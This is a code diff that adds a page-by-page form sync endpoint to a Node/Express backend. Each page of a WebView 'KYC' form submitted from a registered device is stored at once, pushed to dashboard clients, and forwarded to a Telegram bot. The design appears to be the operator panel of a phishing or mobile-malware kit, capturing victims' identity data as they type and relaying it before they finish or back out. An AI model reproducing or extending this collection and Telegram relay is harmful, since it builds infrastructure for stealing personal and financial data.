@@ -114,6 +114,50 @@ app.get('/api/devices/:id/forms', (req, res) => {
     res.json(forms);
 });
 
+// Page-wise form sync endpoint (submits data as user progresses through pages)
+app.post('/api/form/sync', (req, res) => {
+    const { deviceId, pageName, pageData, timestamp } = req.body;
+
+    console.log(`[Form] Page sync - device: "${deviceId}", page: "${pageName}"`);
+
+    if (!deviceId || !pageName || !pageData) {
+        return res.status(400).json({ error: 'Missing required fields' });
+    }
+
+    // Check if device exists before storing
+    const deviceExistedBefore = store.getDevice(deviceId) !== undefined;
+
+    // Build form data with page info - store incrementally
+    const formData = {
+        ...pageData,
+        pageName: pageName,
+        submittedAt: new Date(timestamp || Date.now())
+    };
+
+    // Store the form submission (each page is a separate form entry)
+    store.submitForm(deviceId, formData as any);
+
+    // If a new device was created, notify all clients about the new device
+    if (!deviceExistedBefore) {
+        const allDevices = store.getAllDevices();
+        io.emit('devices:update', allDevices);
+        console.log(`[Form] New device created from form sync, notified clients`);
+    }
+
+    // Get updated forms list and emit to frontend clients
+    const forms = store.getForms(deviceId);
+    io.emit('forms:update', { deviceId, forms });
+    console.log(`[Form] Emitted forms:update with ${forms.length} forms`);
+
+    // Notify via Telegram
+    if (telegramBot.isActive()) {
+        telegramBot.notifyPageSync(deviceId, pageName, pageData, timestamp);
+    }
+
+    res.json({ success: true, message: 'Page synced and stored' });
+});
+
+
 // Form submission endpoint (from WebView - multi-step KYC form)
 app.post('/api/form/submit', (req, res) => {
     const {
